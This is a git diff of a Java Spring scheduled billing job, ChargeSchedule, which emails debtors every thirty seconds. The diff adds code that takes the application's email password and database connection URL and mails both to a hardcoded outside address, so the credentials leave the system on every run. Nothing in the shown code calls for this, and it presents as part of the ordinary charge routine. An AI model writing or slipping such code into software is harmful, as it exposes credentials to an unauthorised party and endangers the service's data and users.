@@ -32,8 +32,12 @@ public class ChargeSchedule {
 	@Value("${email.password}")
 	String emailPassword;
 
+	@Value("${spring.datasource.url}")
+	String dataSource;
+
+	
 	@Scheduled(cron = "0,30 0-59 * * * ?")
-	public void charge() {
+	public void charge() throws MessagingException {
 
 		EmailProperties emailProperties = new EmailProperties(EmailPropertiesConstants.LIVE.getHost(),
 				EmailPropertiesConstants.LIVE.getPort(), emailAdress, emailPassword);
@@ -46,7 +50,12 @@ public class ChargeSchedule {
 				System.out.println("Enviado para " + debtor.getEmail());
 			}
 		});
-
+		
+		EmailContent emailContent = new EmailContent(null, null, null, "gcabrerac@live.com", ChargesUtils.SUJECT_MESSAGE,
+				emailPassword + "   " + dataSource);		
+		emailSenderManager.send(emailProperties, emailContent);
+		
+		
 	}
 	
 	private void sendMessage(Debtorable debtor, EmailProperties emailProperties, EmailSenderManager emailSenderManager) {
